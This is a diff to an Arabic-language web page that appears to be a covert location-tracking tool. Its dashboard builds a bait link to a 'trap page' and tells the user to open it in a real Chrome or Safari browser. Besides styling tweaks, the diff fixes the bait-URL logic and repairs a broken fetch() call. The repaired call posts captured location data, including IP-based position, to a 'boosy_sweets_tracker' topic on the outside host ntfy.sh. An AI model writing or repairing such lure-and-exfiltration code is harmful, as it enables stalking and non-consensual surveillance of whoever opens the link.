@@ -253,7 +253,7 @@
                     <h3 class="text-xs font-extrabold text-[#111111] flex items-center gap-1.5">
                         <span class="text-[#FF91A4]">💡</span> دليلك لاختبار الرادار بنجاح على تليفونك:
                     </h3>
-                    <ul class="text-[11px] text-gray-700 space-y-2 list-decimal list-inside leading-relaxed">
+                    <ul class="text-[11px] text-gray-700 space-y-2 list-decimal list-inside leading-relaxed font-sans">
                         <li>افتحي هذه اللوحة من <strong>كمبيوتر</strong> أو <strong>موبايل آخر</strong>.</li>
                         <li>اضغطي على الزر بالأسفل لفتح صفحة المصيدة في <strong>نافذة جديدة تماماً</strong>.</li>
                         <li><strong>الخطوة الأهم:</strong> انسخي الرابط وافتحي متصفح <strong>Google Chrome</strong> أو <strong>Safari</strong> الحقيقي والصقي الرابط هناك! (تجنبي تماماً مستعرض الواتساب الداخلي).</li>
@@ -272,7 +272,7 @@
                 <!-- Cyber Radar & Map View Box -->
                 <div class="bg-white rounded-2xl p-5 border border-pink shadow-pink relative flex flex-col justify-between min-h-[460px]">
                     <div class="flex items-center justify-between border-b border-pink/30 pb-3">
-                        <h2 class="text-sm font-extrabold text-[#111111] flex items-center gap-2">
+                        <h2 class="text-sm font-extrabold text-[#111111] flex items-center gap-2 flex-wrap">
                             <span class="w-2.5 h-2.5 rounded-full bg-[#FF91A4] animate-ping"></span>
                             الرصد الجغرافي المباشر وخريطة الأقمار الصناعية
                         </h2>
@@ -344,7 +344,7 @@
     </footer>
 
     <!-- Toast Notice Module -->
-    <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-white text-black border-2 border-[#FF91A4] text-xs font-bold px-6 py-3 rounded-full shadow-2xl z-50 transition-all duration-300 transform translate-y-20 opacity-0">
+    <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-white text-black border-2 border-[#FF91A4] text-xs font-bold px-6 py-3 rounded-full shadow-2xl z-50 transition-all duration-300 transform translate-y-20 opacity-0 font-sans">
         <span id="toast-text"></span>
     </div>
 
@@ -380,7 +380,7 @@
         // Instant generation to bypass copy "جاري التوليد" issue!
         function forceImmediateMessagePopulation() {
             try {
-                let cleanUrl = window.location.href.split('?')[0];
+                let cleanUrl = window.location.origin + window.location.pathname;
                 if (cleanUrl.includes('usercontent.google') || cleanUrl.includes('localhost') || cleanUrl.includes('127.0.0.1')) {
                     cleanUrl = "https://se-sweet.vercel.app/";
                 }
@@ -467,7 +467,7 @@
 
         function updateBaitElements() {
             try {
-                let cleanUrl = window.location.href.split('?')[0];
+                let cleanUrl = window.location.origin + window.location.pathname;
                 const customUrlInput = document.getElementById('custom-base-url');
                 
                 if (customUrlInput && customUrlInput.value.trim() !== "") {
@@ -705,7 +705,7 @@
             };
 
             try {
-                await fetch::`https://ntfy.sh/boosy_sweets_tracker_${session}`({
+                await fetch(`https://ntfy.sh/boosy_sweets_tracker_${session}`, {
                     method: 'POST',
                     body: JSON.stringify(payload)
                 });
@@ -738,7 +738,7 @@
                 if (accSpan) accSpan.innerText = `${Math.round(accuracy / 1000)} كم (تقريبي)`;
                 if (badge) {
                     badge.innerText = "رصد تقريبي بالشبكة (IP)";
-                    badge.className = "bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold";
+                    badge.className = "bg-amber-100 text-amber-700 px-3 py-1 rounded-full text-[10px] font-bold font-sans";
                 }
             }
 
